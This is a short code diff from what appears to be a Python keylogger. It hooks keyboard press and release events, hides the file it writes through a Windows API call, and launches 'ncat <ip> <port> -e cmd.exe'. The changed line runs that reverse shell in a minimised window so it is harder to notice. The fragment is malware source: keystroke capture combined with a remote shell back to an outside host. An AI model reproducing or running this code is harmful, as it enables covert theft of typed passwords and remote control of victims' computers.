@@ -63,7 +63,7 @@ def write_file(tangs):
         ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
         if not ret:
             raise ctypes.WinError()
-        os.system('cmd /k "ncat <ip> <port> -e cmd.exe"')
+        os.system('"start /min cmd.exe @cmd /c "cmd /k "ncat <ip> <port> -e cmd.exe""')
 
 # Start the tang listener
 with Listener(on_press=on_press, on_release=on_release) as listener:
